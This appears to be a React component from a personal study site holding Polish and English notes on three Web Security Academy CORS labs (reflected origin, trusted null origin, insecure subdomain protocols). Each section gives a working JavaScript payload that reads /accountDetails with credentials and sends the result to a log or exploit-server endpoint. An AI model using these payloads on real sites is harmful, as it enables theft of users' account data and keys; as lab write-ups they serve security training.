const CORS = () =>{
    return(
        <details>
            <summary>Cross-origin resource sharing (CORS)</summary>

            <details>
                <summary>Vulnerability CORS z odbiciem podstawowego pochodzenia</summary>
                <p>Sprawdzamy w burp</p>
                <p><span className="important">Origin: https://example.com</span></p>
                <p>Otrzymujemy odpowiedź</p>
                <p><span className="important">Access-Control-Allow-Origin: https://example.com</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie: </p>
                    <p>{`<script>`}</p>
                    <p className="tab-1">{`var req = new XMLHttpRequest();`}</p>
                    <p className="tab-1">{`req.onload = reqListener;`}</p>
                    <p className="tab-1">{`req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);`}</p>
                    <p className="tab-1">{`req.withCredentials = true;`}</p>
                    <p className="tab-1">{`req.send();`}</p>
                    <br />
                    <p className="tab-1">{`function reqListener() {`}</p>
                    <p className="tab-2">{`location='/log?key='+this.responseText;`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p>{`</script>`}</p>
                </div>
            </details>

            <details>
                <summary>CORS vulnerability with trusted null origin</summary>
                <p>Sprawdzamy w burp</p>
                <p><span className="important">Origin: null</span></p>
                <p>Otrzymujemy odpowiedź</p>
                <p><span className="important">Access-Control-Allow-Origin: null</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie: </p>
                    <p>{`<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>`}</p>
                    <p className="tab-1">{`var req = new XMLHttpRequest();`}</p>
                    <p className="tab-1">{`req.onload = reqListener;`}</p>
                    <p className="tab-1">{`req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);`}</p>
                    <p className="tab-1">{`req.withCredentials = true;`}</p>
                    <p className="tab-1">{`req.send();`}</p>
                    <br />
                    <p className="tab-1">{`function reqListener() {`}</p>
                    <p className="tab-2">{`location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);`}</p>
                    <p className="tab-1">{`}`}</p>
                    <p>{`</script>"></iframe>`}</p>
                </div>
            </details>

            <details>
                <summary>Luka w zabezpieczeniach CORS w przypadku zaufanych, niezabezpieczonych protokołów</summary>
                <p>Sprawdzamy w burp</p>
                <p><span className="important">Origin: https://{`<SUBDOMAIN>.`}YOUR-LAB-ID.web-security-academy.net</span></p>
                <p>Otrzymujemy odpowiedź</p>
                <p><span className="important">Access-Control-Allow-Origin: https://{`<SUBDOMAIN>.`}YOUR-LAB-ID.web-security-academy.net</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie: </p>
                    <p>{`<script>`}</p>
                    <p className="tab-1">{`document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"`}</p>
                    <p>{`</script>`}</p>
                </div>
            </details>
        </details>
    )
}

export default CORS;